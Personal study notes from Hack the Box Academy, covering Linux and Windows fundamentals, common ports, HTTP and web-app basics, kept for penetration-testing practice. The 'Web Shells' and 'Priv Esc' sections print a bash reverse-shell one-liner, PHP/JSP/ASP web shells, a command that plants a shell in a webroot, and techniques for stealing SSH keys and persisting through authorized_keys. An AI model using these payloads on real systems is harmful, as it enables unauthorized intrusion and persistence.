# Hack the Box Academy

# Learning Process
## Learning Efficiency
- Find out the information you need by asking two questions:
    - What do we alreaday know?
    - What don't we know yet?

# Intro to Linux
Tags: #Linux ; #LinuxShortcuts #Shortcuts #Bash; BashShortcuts
- remember `env | grep mail` can print all environment variables and filter for a specific value

Cursor Movement

`[CTRL]` + `A` - Move the cursor to the beginning of the current line.

`[CTRL]` + `E` - Move the cursor to the end of the current line.

`[CTRL]` + `[←]` / `[→]` - Jump at the beginning of the current/previous word.

`[ALT]` + `B` / `F` - Jump backward/forward one word.
Erase The Current Line

`[CTRL]` + `U` - Erase everything from the current position of the cursor to the beginning of the line.

`[Ctrl]` + `K` - Erase everything from the current position of the cursor to the end of the line.

`[Ctrl]` + `W` - Erase the word preceding the cursor position.
Paste Erased Contents

`[Ctrl]` + `Y` - Pastes the erased text or word.
Ends Task

`[CTRL]` + `C` - Ends the current task/process by sending the SIGINT signal. For example, this can be a scan that is running by a tool. If we are watching the scan, we can stop it / kill this process by using this shortcut. While not configured and developed by the tool we are using. The process will be killed without asking us for confirmation.
End-of-File (EOF)

`[CTRL]` + `D` - Close STDIN pipe that is also known as End-of-File (EOF) or End-of-Transmission.
Clear Terminal

`[CTRL]` + `L` - Clears the terminal. An alternative to this shortcut is the clear command you can type to clear our terminal.
Background a Process

`[CTRL]` + `Z` - Suspend the current process by sending the SIGTSTP signal.
Search Through Command History

`[CTRL]` + `R` - Search through command history for commands we typed previously that match our search patterns.

`[↑]` / `[↓]` - Go to the previous/next command in the command history.
Switch Between Applications

`[ALT]` + `[TAB]` - Switch between opened applications.
Zoom

`[CTRL]` + `[+]` - Zoom in.

`[CTRL]` + `[-]` - Zoom out.

# Getting Started - Windows
Tags: #Windows #Powershell
- `Get-ExecutionPolicy -List` - check system Execution Policy - validate you can download, load, and run modules/scripts
  - Can edit/change the policy for the scope of the process (i.e. current Powershell process)
- `Set-ExecutionPolicy Unrestricted -Scope Process`
- Install the `PSWindowsUpdate` with `Install-Module PSWindowsUpdate`
- Update with `Install-WindowsUpdate -AcceptAll`

## Defender Exemptions
Tags: #WindowsDefender
- `C:\Users\Username\`
  - `\Documents\`
    - `git-repos`
    - `scripts`
  - `\AppData\Local\Temp\Chocolatey`
- Add exemption/exclusion with `Add-MpPreference -ExclusionPath "C:\directory\here`

Tools to install older versions of Windows
- https://community.chocolatey.org/
- https://gist.github.com/AveYo/c74dc774a8fb81a332b5d65613187b15
- https://www.heidoc.net/joomla/technology-science/microsoft/67-microsoft-windows-and-office-iso-download-tool%EF%BB%BF
- https://rufus.ie/en_US/

# Getting Started w/ HTB
Tags: #CommonPorts #Ports

|Port(s) |	Protocol|
|--------|----------|
|20/21 (TCP) |	FTP|
|22 (TCP) |	SSH|
|23 (TCP) |	Telnet|
|25 (TCP) |	SMTP|
|80 (TCP) |	HTTP|
|161 (TCP/UDP) |	SNMP|
|389 (TCP/UDP) |	LDAP|
|443 (TCP) 	|SSL/TLS (HTTPS)|
|445 (TCP) 	| SMB|
|3389 (TCP) |	RDP|

- Common Ports: https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-ports.html
- https://packetlife.net/media/library/23/common-ports.pdf
- Top 1000 by nmap: https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/

## Service Scanning
### SNMP
Tags: #SNMP
- Access to SNMP (v1 and 2c) is controlled using a plaintext community string
  - Examination of process parameters might reveal credentials passed on the command line

## Web Enum
Tags: #WebEnumeration #Enumeration
- Tools to remember
  - `gobuster`
  - `whatweb`
  - `curl` for banner grabbing
## Web Shells
Tags: #Shells #TTY
### Reverse Shells
- Reverse Shell Cheat Sheet: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- Payload All the Things Github: https://github.com/swisskyrepo/PayloadsAllTheThings
- PATT GitHub Lots of HElpful Cheat Sheets: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources
  - One not included: `bash -c 'bash -i >& /dev/TCP/10.10.10.10/1234 0>&1'`

### Bind Shells
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md

### Upgrading TTY
- Upgrading TTY = move cursor left/right, edit commands, access command history (up/down arrows)
- Achieved by mapping the terminal TTY with remote TTY

1. Netcat Shell: `Rich@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'`
2. Type `CTRL`+`Z` to background shell
3. Regular Local Terminal: 
  - `stty raw -echo`
  - `fg`
  - `[Enter]`
  - `[Enter]`


If shell doesn't cover entire terminal:
- Separate/new local terminal window: 
  - `echo $TERM`
  - `stty size`
- Back in netcat connection:
  - `www-data@remotehost$ export TERM=xterm-256color`
  - `www-data@remotehost$ stty rows 67 columns 318`

### Web Shells
Code: `php`

`<?PHP system($_GET['cmd']);?>`

Code: `jsp`

`<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`

Code: `asp`

`<% eval request("cmd") %>`


|Web Server |	Default Webroot|
|---|---|
|Apache |	/var/www/html/ |
|Nginx |	/usr/local/nginx/html/ |
|IIS |	c:\inetpub\wwwroot\ |
|XAMPP |	C:\xampp\htdocs\ |

- Attacking a Linux host running Apache, with PHP:
  - `echo "<?PHP system(\$_GET['cmd']);?>" > /var/www/html/shell.php`
  - Then visit the `shell.php` page, and use `?cmd=[cmd_here]` to execute commands
  - Alternatively can `curl`

## Priv Esc
Tags: #PrivEsc #PrivilegeEscalation #Enumeration #SSH
### Resources:
Privilege Escalation Checklists:
- [HackTricks](https://book.hacktricks.xyz/)
  - [Linux](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
  - [Windows](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
  - [Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
  - [Windows](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [LOLBAS](https://lolbas-project.github.io/#) - similar to GTFOBins, but for Windows

Enumeration Scripts:
- Linux
  - [Linenum](https://github.com/rebootuser/LinEnum.git)
  - [Linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)
- Windows
  - [Seatbelt](https://github.com/GhostPack/Seatbelt)
  - [JAWS](https://github.com/411Hall/JAWS)
- [Priv Esc Awesome Scripts SUITE - PEASS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
- Use `dpkg -l` and look at `C:\Program Files\` for software installed

### Scheduled Tasks
- If we can **write to a directory called by a cron job** - can write a bash script with a reverse shell command, which sends a reverse shell when executed

### SSH Keys
- If we have read access over the `.ssh` directory, can read the private key in `/home/user/.ssh/id_rsa/` or `/root/.ssh/id_rsa` (file: `id_rsa` = private key)
- Then use `ssh user@IP_ADDR -i id_rsa`
- If we have write access over `/.ssh/`, then place our public key in the user's `.ssh/authorized_keys` dir
  - Used to gain ssh access after gaining a shell as that user
  - generate key on local host, then copy `key.pub` to the remote machine
  - Write to `authorized_keys` file by using `echo` and appending

## Transferring Files
- Use the `-o filename` flag with `curl` to send output to file
- Use `base64` to encode the file, and copy/paste the string
  - use `-w 0` to disable line wrapping

# Resources
## Videos
|Resource | Description|
| ---| ---|
|[IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA") | Provides an extremely in-depth walkthrough of every retired HTB box packed full of insight from his own experience, as well as videos on various techniques.|
|[VbScrub](https://www.youtube.com/channel/UCpoyhjwNIWZmsiKNKpsMAQQ")|Provides HTB videos as well as videos on techniques, primarily focusing on Active Directory exploitation.|
[STÖK](https://www.youtube.com/channel/UCQN2DsjnYH60SFBIA6IkNwg"|Provides videos on various infosec related topics, mainly focusing on bug bounties and web application penetration testing.|
|[LiveOverflow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w")|Provides videos on a wide variety of technical infosec topics.|

## Blogs
- [0xdf hacks Stuff](https://0xdf.gitlab.io/) - walkthroughs of HTB, write-ups on recent exploits/attacks, aD Exploitation techniques, CTF event write-ups, bug bounty report write ups.

## HTB Challenges & Boxes

<p>There are many beginner-friendly machines on the main HTB platform. Some recommended ones are:</p>
<table>
<thead>
<tr>
<th><a href="https://www.hackthebox.eu/home/machines/profile/1">Lame</a></th>
<th><a href="https://www.hackthebox.eu/home/machines/profile/51">Blue</a></th>
<th><a href="https://www.hackthebox.eu/home/machines/profile/121">Nibbles</a></th>
<th><a href="https://www.hackthebox.eu/home/machines/profile/108">Shocker</a></th>
<th><a href="https://www.hackthebox.eu/home/machines/profile/144">Jerry</a></th>

Challenges
th><a href="https://www.hackthebox.eu/home/challenges/Reversing?name=Find%20The%20Easy%20Pass">Find The Easy Pass</a></th>
<th><a href="https://www.hackthebox.eu/home/challenges/Crypto?name=Weak%20RSA">Weak RSA</a></th>
<th><a href="https://www.hackthebox.eu/home/challenges/Pwn?name=You%20know%200xDiablos">You know 0xDiablos</a></th>

# Windows Fundamentals
Tags: #Windows #directories #WindowsDirectories
## Intro to Windows 
- [cmdlet Overview](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/cmdlet-overview?view=powershell-7)
- [`Get-WmiObject` Overview](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1)
  - Get instances of WMI classes or other info about available WMI classes
  - `Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber`
  - Other useful classes to be used w/`Get-WmiObject`: `Win32_Process` (list processes), `Win32_Service` (list services), `Win32_Bios` (get BIOS information), and `ComputerName` (to get information about remote computers)
  - Can stop/start services locally/remotely
  - More info - https://ss64.com/ps/get-wmiobject.html & https://adamtheautomator.com/get-wmiobject/

- Connect to Windows Targets via Linux with `xfreerdp` command: `xfreerdp /v:<targetIP> /u:<username> /p:<password>`

## OS Structure

|Directory |	Function |
|---|---|
|Perflogs 	Can hold Windows performance logs but is empty by default.|
|Program Files |	On 32-bit systems, all 16-bit and 32-bit programs are installed here. On 64-bit systems, only 64-bit programs are installed here.|
|Program Files (x86) |	32-bit and 16-bit programs are installed here on 64-bit editions of Windows.|
|ProgramData |	This is a hidden folder that contains data that is essential for certain installed programs to run. This data is accessible by the program no matter what user is running it.
|Users 	|This folder contains user profiles for each user that logs onto the system and contains the two folders Public and Default.|
|Default |	This is the default user profile template for all created users. Whenever a new user is added to the system, their profile is based on the Default profile.|
|Public |	This folder is intended for computer users to share files and is accessible to all users by default. This folder is shared over the network by default but requires a valid network account to access.|
|AppData 	|Per user application data and settings are stored in a hidden user subfolder (i.e., cliff.moore\AppData). Each of these folders contains three subfolders. The Roaming folder contains machine-independent data that should follow the user's profile, such as custom dictionaries. The Local folder is specific to the computer itself and is never synchronized across the network. |LocalLow is similar to the Local folder, but it has a lower data integrity level. Therefore it can be used, for example, by a web browser set to protected or safe mode.|
|Windows |	The majority of the files required for the Windows operating system are contained here.|
|System, System32, SysWOW64 |	Contains all DLLs required for the core features of Windows and the Windows API. The operating system searches these folders any time a program asks to load a DLL without specifying an absolute path.|
|WinSxS |	The Windows Component Store contains a copy of all Windows components, updates, and service packs.|

## File System
- Integrity Control Access Control List aka `icalcs`
- Can manage a fine level of granulatity over NTFS file permissions using the command line
- Can list out the NTF permissions by running `icalcs c:\Windows`

|Permission Type |	Description|
|---|---|
|Full Control |	Allows reading, writing, changing, deleting of files/folders.|
|Modify |	Allows reading, writing, and deleting of files/folders.|
|List Folder Contents |	Allows for viewing and listing folders and subfolders as well as executing files. Folders only inherit this permission.|
|Read and Execute |	Allows for viewing and listing files and subfolders as well as executing files. Files and folders inherit this permission.|
|Write |	Allows for adding files to folders and subfolders and writing to a file.|
|Read |	Allows for viewing and listing of folders and subfolders and viewing a file's contents.|
|Traverse Folder |	This allows or denies the ability to move through folders to reach other files or folders. For example, a user may not have permission to list the directory contents or view files in the documents or web apps directory in this example c:\users\bsmith\documents\webapps\backups\backup_02042020.zip but with Traverse Folder permissions applied, they can access the backup archive. |

The resource access level is list after each user in the output. The possible inheritance settings are:
- `(CI)`: container inherit
- `(OI)`: object inherit
- `(IO)`: inherit only
- `(NP)`: do not propagate inherit
- `(I)`: permission inherited from parent container

Basic access permissions are as follows:

- `F `: full access
- `D` :  delete access
- `N` :  no access
- `M` :  modify access
- `RX` :  read and execute access
- `R` :  read-only access
- `W` :  write-only access

Can edit permissions using `icalcs <dir> /grant <user>:<perm>` or `/remove` flag to remove permissions. [Full List of Commands](https://ss64.com/nt/icacls.html)

## Windows Services & Processes
### Services
- Services = Long Running Processes
- Services - can be started automatically @ system boot
- Apps can be installed to run as as service
- Services managed by the SCM (Service Control Manager) via `services.msc`
- Can query/manage servies via `sc.exe` (cmd) or `Get-Service` (PS)
- Categories of Services: Local Services, Network Services and System Services ([Critical System Services](https://docs.microsoft.com/en-us/windows/win32/rstmgr/critical-system-services))
- [Windows Components](https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_components#Services)

|Service |	Description|
|---|---|
|smss.exe |	Session Manager SubSystem. Responsible for handling sessions on the system.|
|csrss.exe 	|Client Server Runtime Process. The user-mode portion of the Windows subsystem.|
|wininit.exe |	Starts the Wininit file .ini file that lists all of the changes to be made to Windows when the computer is restarted after installing a program.|
|logonui.exe |	Used for facilitating user login into a PC|
|lsass.exe |	The Local Security Authentication Server verifies the validity of user logons to a PC or server. It generates the process responsible for authenticating users for the Winlogon service.|
|services.exe |	Manages the operation of starting and stopping services.|
|winlogon.exe |	Responsible for handling the secure attention sequence, loading a user profile on logon, and locking the computer when a screensaver is running.|
|System |	A background system process that runs the Windows kernel.|
|svchost.exe with RPCSS |	Manages system services that run from dynamic-link libraries (files with the extension .dll) such as "Automatic Updates," "Windows Firewall," and "Plug and Play." Uses the Remote Procedure Call (RPC) Service (RPCSS).|
|svchost.exe with Dcom/PnP| 	Manages system services that run from dynamic-link libraries (files with the extension .dll) such as "Automatic Updates," "Windows Firewall," and "Plug and Play." Uses the Distributed Component Object Model (DCOM) and Plug and Play (PnP) services.|

### Processes
- Run in the background
- Either:
  - Run automatically as part of the OS
  - Started by other installed apps
- Can be terminated without severe impact to OS
- Examples: Windows Logon App, System, System Idle Process, Windows Start Up App, Client Server Runtime, Windows Session Manager, Service Host, LSASS process

- `LSASS`- process for enforcing security policy, and user account password changes
- Sysinternals - used to admin Windows Systems - can run procdump (by typing `\\live.sysinternals.com\tools\procdump.exe -accepteula`) without downloading directly to disk
- Process Explorer - part of sysinternals - show which handles and DLL processeare loaded when a program runs

## Windows Sessions
- Interactive session = user authenticates to system with creds
- Non-interactive accounts - don't require login credentials, no passwords associated, used to start services when system boots, or run scheduled tasks
- 3 Types:
  - Local System Account - `NT AUTHORITY\SYSTEM` - most powerful account in Windows - used for OS-related tasks (starting services), more powerful than local admins
  - Local Service Account - `NT AUTHORITY\LocalService` - less priv version of `SYSTEM`, has similar privs to local user account
  - Network Service Account - `NT AUTHORITY\NetworkService` - similar to standard domain user, similar privs to Local SErvice Account on local machine

## Interacting with the OS
Tags: #Powershell #PS
Use `Get-ExecutionPolicy -List`

|Policy |	Description|
|---|---|
|AllSigned |	All scripts can run, but a trusted publisher must sign scripts and configuration files. This includes both remote and local scripts. We receive a prompt before running scripts signed by publishers that we have not yet listed as either trusted or untrusted.|
|Bypass |	No scripts or configuration files are blocked, and the user receives no warnings or prompts.|
|Default |	This sets the default execution policy, Restricted for Windows desktop machines and RemoteSigned for Windows servers.|
|RemoteSigned |	Scripts can run but requires a digital signature on scripts that are downloaded from the internet. Digital signatures are not required for scripts that are written locally.|
|Restricted |	This allows individual commands but does not allow scripts to be run. All script file types, including configuration files (.ps1xml), module script files (.psm1), and PowerShell profiles (.ps1) are blocked.|
|Undefined |	No execution policy is set for the current scope. If the execution policy for ALL scopes is set to undefined, then the default execution policy of Restricted will be used.|
|Unrestricted |	This is the default execution policy for non-Windows computers, and it cannot be changed. This policy allows for unsigned scripts to be run but warns the user before running scripts that are not from the local intranet zone.|
## Windows Management Instrumentation (WMI)
|Component Name |	Description|
|---|---|
|WMI service |	The Windows Management Instrumentation process, which runs automatically at boot and acts as an intermediary between WMI providers, the WMI repository, and managing applications.|
|Managed objects |	Any logical or physical components that can be managed by WMI.|
|WMI providers |	Objects that monitor events/data related to a specific object.|
|Classes |	These are used by the WMI providers to pass data to the WMI service.|
|Methods |	These are attached to classes and allow actions to be performed. For example, methods can be used to start/stop processes on remote machines.|
|WMI repository |	A database that stores all static data related to WMI.|
|CMI Object Manager |	The system that requests data from WMI providers and returns it to the application requesting it.|
|WMI API |	Enables applications to access the WMI infrastructure.|
|WMI Consumer |	Sends queries to objects via the CMI Object Manager.|

WMI Uses: Status info, security settings, user/group permissions, system properties, code exec, scheduling, logging
## Windows Security
Tags: #Windows #SID #WindowsSID #SAM #SAMDatabase #Registry #WinReg
- Security Identifier (SID) - string values with different lengths, stored in security Database.  Added to user's access token to identify actions.
  - Includes Identifier Authority and Relative ID (RID), and with AD, includes domain SID
  - Format: `(SID)-(Revision level)-(Identifier Authority)-(Subauthority1)-(Subauthority2)-(etc)
    - Identifier Authority - 48-bit string that identifies the computer/network that created the SID
    - Subauthority- Variable number identifying User's relation/group described by SID  to athurotiy that created it
    - Subauthority2- Which comp created the number
    - Subauthority3 - RID that distinguishes one account from another (user, guest, admin, etc)
  
### SAM Database and Access Control Entries
- Access rights are managed by Access Control Entries (ACE) in Access Control Lists (ACLs)
- Permissions to access a securable object are classified as: `Discretionary Access Control List (DACL)` or `System Access Control List (SACL)`.
- Every thread/rpocess started or initiated by a user goes through an authorization process - of which access tokens are validated by the LSA (Local Security Authority), which includes the SID and other security-relevant info.

### Registry
- Hierarchical Database in Windows critical for OS
- Stores low level settings of OS and apps that use it
Tags: #registry #WindowsRegistry

|Value |	Type|
|---|---|
|REG_BINARY |	Binary data in any form.|
|REG_DWORD |	A 32-bit number.|
|REG_DWORD_LITTLE_ENDIAN |	A 32-bit number in little-endian format. Windows is designed to run on little-endian computer architectures. Therefore, this value is defined as REG_DWORD in the Windows header files.|
|REG_DWORD_BIG_ENDIAN |	A 32-bit number in big-endian format. Some UNIX systems support big-endian architectures.|
|REG_EXPAND_SZ |	A null-terminated string that contains unexpanded references to environment variables (for example, "%PATH%"). It will be a Unicode or ANSI string depending on whether you use the Unicode or ANSI functions. To expand the environment variable references, use the ExpandEnvironmentStrings function.|
|REG_LINK |	A null-terminated Unicode string containing the target path of a symbolic link created by calling the RegCreateKeyEx function with REG_OPTION_CREATE_LINK.|
|REG_MULTI_SZ |	A sequence of null-terminated strings, terminated by an empty string (\0). The following is an example: String1\0String2\0String3\0LastString\0\0 The first \0 terminates the first string, the second to the last \0 terminates the last string, and the final \0 terminates the sequence. Note that the final terminator must be factored into the length of the string.|
|REG_NONE |	No defined value type.|
|REG_QWORD |	A 64-bit number.|
|REG_QWORD_LITTLE_ENDIAN |	A 64-bit number in little-endian format. Windows is designed to run on little-endian computer architectures. Therefore, this value is defined as REG_QWORD in the Windows header files.|
|REG_SZ |	A null-terminated string. This will be either a Unicode or an ANSI string, depending on whether you use the Unicode or ANSI functions.|

- `HKLM` - settings relevant to local system
- Can find registry files at `C:\Windows\System32\Config\`
- `HKCU` - user-specific registry hive (stored at `C:\Windows\User\<USERNAME>\NTuser.dat`)
- [`Run` and `RunOnce` registry Keys](https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys) - supports software and files loaded into memory on login

`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`
`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce`
`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce`

```
PS C:\htb> reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
    RTHDVCPL    REG_SZ    "C:\Program Files\Realtek\Audio\HDA\RtkNGUI64.exe" -s
    Greenshot    REG_SZ    C:\Program Files\Greenshot\Greenshot.exe
```
### Local Group Policy
- Use `gpedit.msc` to edit local group policy

- For #WindowsDefender, you can run `PS> Get-MpComputerStatus` to check which protection settings are enabled

## Microsoft Management Console (MMC)
- Group snap ins, admin tools to manage hardware, software and network components
- Type `mmc` in start menu
## Windows Subsystem for Linux (WSL)
- WSL can be installed in `PS` by running `Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux` as an admin

# Web Requests
Tags: #webrequests #HTTP
## Intro
### HTTP
- Example website: `http://admin:password@inlanefreight.com:80/dashboard.php?login=true#status`
  - Scheme: `http`
  - User: `admin:password`
  - Host: `inlanefreight.com`
  - Port: `80`
  - Path: `dashboard.php`
  - Query String: `login=true`
  - Fragment: `status`

|Component| Description|
|---|---|
|Scheme | identify protocol - typically `http` or `https`|
| User Info | credentials used to authenticate to host (optional)|
| Host|resource location - either hostname or IP Address|
|Port|Port to connect to on host running web service|
|Path|Resource being accessed, can be file, folder.  If nothing specified, returns default index document (i.e. `index.html`)|
|Query String|preceded by a `?` - component to pass information to the resource (optional). Consists of a parameter (`login`) and a value (`true`).  Multiple parameters can be separated by a ampersand (`&`)|
|Fragment|processed by browsers, on clinet side to locate sections within primary resource|

### Request/Response
Tags: #httprequest #httpresponse
Request: `GET /users/login.html HTTP/1.1`
- HTTP Method: `GET` - specifies type of action to perform
- Path: ` /users/login.html` - resource being accessed, can be suffixed w/Query STring
- Version: `HTTP/1.1`

Response: `HTTP/1.1 200 OK`
- Version: `HTTP/1.1`
- Response Code: `200 OK`

### Headers
Tags: #HTTP #Headers #HTTPHeaders
Complete list of standard HTTP Headers: [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
#### General Headers
Common to both request and response. Contextual, to describe the message, rather than the contents
- `Date` - date and time which message originated, preferred to convert to UTC
- `Connection` - dictates the current network connectio nshould stay alive after request finishes: `close`, or `keep-alive`
#### Entity Headers
Common to both request/responses.  Used to describe the context (entity) being transferred by the message.  Usually found in `POST`/`PUT` requests
- `Content-Type` - describes type of resource being transferred. Automatically added by browsers on client-side, and returned in server response
- `Media-Type` - describes data being passed (i.e. `application/pdf`, `image/png`). **can be** CRUCIAL in server interpretation. `charset` denotes encoding standard (`UTF-8`)
- `Boundary` - separate content when there's 2+ types of content in the same message
- `Content-Length` - size of entity being passed. Necessary for server to read data from message body
- `Content-Encoding` - specify type of encoding
#### Request Headers
For Client --> Server Comms (HTTP Request). Don't relate to the content of the message.
- `Accept`, `Accept-*` and `IF-*` allow for conditional requests
- `Cookie` & `User-Agent` allow for customization of the response
- [Comprehensive List of HTTP Header Requests](https://tools.ietf.org/html/rfc7231#section-5)
- `Host` - specify host being queried for resource. Domain name or IP. Host header is important for #enumeration
- `User-Agent` - describe client requesting resources
- `Accept` - describes media types client can understand. If multiple media types - separated by `,` and `*/*` signifies all media types.
- `Cookie` - cookie-value pairs in the format `name=value`. Multiple cookies are separated by a `;` - stored client & server side
- `Referer` - denotes where current request is coming from. Easy to manipulate
- `Authorization` - another way for server to identify clients. Holds token unique to the client. Only stored client side & retrieved by server per request
#### Respomse Header
HTTP responses. Don't relate to message content
- `Age`, `Location`, & `Server` provide more context about response
- [HTTP Response Headers](https://tools.ietf.org/html/rfc7231#section-6)
- `Server` - info about HTTP server, which handled request. Can get server version and #enumerate further
- `Set-Cookie`- cookies needed for client identification. Parse the cookies and store for future requests
- `WWW-Authenticate`- notifies client about type of authentication to access requested resource.
#### Security Headers
Response headers. USed to specify rules & policies followed by browser. [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
-`Content-Security-Policy`- website's policy towards injected resources (i.e. JavaScript & script resources). Instructs browser to accept resources from certain trusted domains. Prevents XSS
-`Strict-Transport-Security`- prevents browser from accessing website over plaintext HTTP. Prevents MITM
-`Referrer-Policy`- dictates whether browser should include value specified by `Referrer` header or not. Avoids disclosing sensitive URLs & info when browsing

## HTTP Methods/Codes
Methods tell server how to process request sent & how to reply.
|Method|Description|
|---|---|
|`GET`| Most common method, requests a resource. |
|`POST`| send data to server. Can handle multiple input types. Appended to request body after headers. Used to send info (forms/logins) or updating data to website |
|`HEAD`| requests headers returned if `GET` is made. Used to check response length
|`PUT`| similar to `POST`, creates new resources on server. Allows for malicious uploads #maliciousuploads #upload |
|`DELETE` | Lets users delete existing resource on webserver. Can lead to #DoS |
| `OPTIONS`| returns info about server (i.e. methods accepted by it)|

`PUT`or `DELETE` = WebDAV servers

|Response Codes|Description|
|---|---|
|1xx|Info & continues processing request|
|2xx|successful request|
|3xx|client redirect|
|4xx|improper requests|
|5xx|server issue|

## Methods
### `POST` Method
- Places user parameters in HTTP Request body
- When coming across a login form that accepts logins via `GET` request, it should be a high finding
- Only characters that are needed to be encoded are those that separate params
- Can send more data

- Session IDs are almost always hashes, which can be identified by: containing only hex characters,and being divisible by 8
- Popular `Content-Type` = `JSON`

### `PUT` & `DELETE` Methods
- Usually allowed on [Web Distributed Authoring & Versioning (WebDAV)](https://en.wikipedia.org/wiki/WebDAV) servers
- WebDAV = extension of HTTP, used for remote management of files and folders

## `cURL`
- Default CURL requests: `GET`
- can get verbose with `-v` flag
- `-L` = follow redirects
### `cURL` `POST` Method
- default `Content-Type` is `application/x-www-form-urlencoded` *or* can be specified with `-H` flag
- Data can be passed using `-d`
- `--cookie` or `--cookie-jar` can specify cookie usage in `cURL`. Points to where cookies are saved.

### `PUT`/`DELETE` `cURL` Methods
- Use `-X` to specify other methods.

# Intro to Web Apps
Tags: #webapps #webapplications
- "Front End Trinity" = HTML, CSS, & Javascript.  Review these as a common procedure
- Can add creds to hyperlink, or use `-u` flag


Continue @ `Attacking Web Apps`
## Web App Layout
Layers:
- **Infrastructure** - required components (i.e. Database) needed for functionality. Many different models
  - Examples: **Client-Server**; **One Server**; **Many Servers - 1 DB**; and **Many Servers Many DBs**
- **Components** - what web appliation interacts with - divided into **UI/UX**, **Client** and **Server**
  - Example Components:
    - Client
    - Server (Webserver, Web App Logic, Database)
    - Services (Microservices; 3rd Party Integrations; Web App Integrations)
    - Functions (Serverless)
- **Architecture**- relationship between web app **components**
  - Presentation Layer - UI Process components that enable comms with app & system. Returned via HTML, JS, and CSS
  - App Layer - Ensures all client requests correctly processed and validates criteria (auth, privs, & data)
  - Data Layer - works with App Layer to determin where require data is stored/how it's accessed

### Infrastructure
**Client-Server**
- Server hosts web app and distributes it to any client trying to access
- Two Components: **Front End** (executed on client/browswer) and **Back End** (compiled, interpreted and executed by hosting server)

**One Server**
- Entire Web App(s) & components hosted on a single server

### Microservices
Independent components of wep app, which - in most cases - are programmed for 1 task only
- Communication is stateless, as data is stored separately from the various microservices
- considered *service-oriented architecture(SOA)* - a collection of different automated functions focused on a single business goal
- Can be written in different programming languages and still interact

Benefits:
- Agility
- Flexible Scaling
- Easy Deployment
- Reusable Code
- Resilience

[Whitepaper on Microservices](https://d1.awsstatic.com/whitepapers/microservices-on-aws.pdf)

### Serverless
Provide application frameworks to build web apps without worrying about servers. Run on stateless computing containers.
[AWS Serverless Offerings](https://aws.amazon.com/serverless)
[AWS Serverless Explanation](https://aws.amazon.com/lambda/serverless-architectures-learn-more/)


## Front End vs Backend
### Front End
- source code of web page viewed when visiting web app - usually including HTML, CSS, and JavaScript.

### Back End
- Four Main back end Components:
  - **Back End Server** - i.e. Linux, Windows, Container
  - **Web Server** - Apache, NGINX, IIS
  - **Database** - MySQL, MSSQL, Oracle, PostgreSQL, NoSQL, MongoDB
  - **Dev Framework** - PHP, C#, Java, Python, JavaScript

Back End Jobs:
- main logic and services of back end of web app
- Main code and functionalities
- Develop & maintain backend database
- Develop & implement libraries
- Implement technical/business needs for web app
- Implement main APIs for front end component comms
- Integrate remote servers & cloud services into web app

## Front End - HTML
- Each element can contain other HTML elements
- Main `html` tag should contain all other elemtns iwthin the page, which falls under `document` element
  - Distinguishes `html` from `xml` and other languages
- Tags have element `id`s, for CSS to format the element
- In URLs, browsers can only use ASCII encoding
- Document Object Model (`DOM`): platform, and language neutral interface that allows programs and scripts to dynamically access and update the content, structure, and style of a document
  - `<head>` element - contains elements that are not directly printed to teh page
  - `<body>` - includes all the main page elements
  - `<style>` - holds' the page's CSS code
  - `<script>` - holds JS code of page
- **DOM Standard**
  - *Core DOM* - standard model for all document types
  - *XML DOM* - standard for XML Docs
  - *HTML DOM* - standard for HTML Docs
- Dom references: `document.head` ; `document.h1`
- Helps understand where each element on a page is located

## Front End - CSS
- Formats and sets the style of HTML elements
- Defines the style for that element in `{}`. For example: `element { property: value }`
- [XSS Animation Properties](https://www.w3schools.com/css/css3_animations.asp)
- CSS Frameworks: Bootstrap, SASS, Foundation, Bulma, Pure


## Front End - JavaScript
- Predominantly front-end executed within broswer, but can be used on back-end with web-app development like `NodeJS`
- JavaScript controls functionality of front-end
  - HTML/CSS change how a web page looks
- Can load javascript with the following syntax:
Code: `HTML`
```
<script type="text/javascript">
  ...JS Code...
</script>
```
- Load remote content with: `<script src="./script.js"></script>`

Used to:
- Web Page Functionality - ex. update web page in real time, dynamically updating content in real time, accepting/processing user input, etc.
- Automate Complex Processes and perform HTTP Requests to interact w/back end components
- Send & Retrieve Data through Ajax
- Used CSS for advanced animations

- **JavaScript Frameworks** - have libraries that make it simple to re-create advanced functionalities (i.e. user login, registration, etc). Examples: AngularJS, React.js, Vue.js, and jQuery
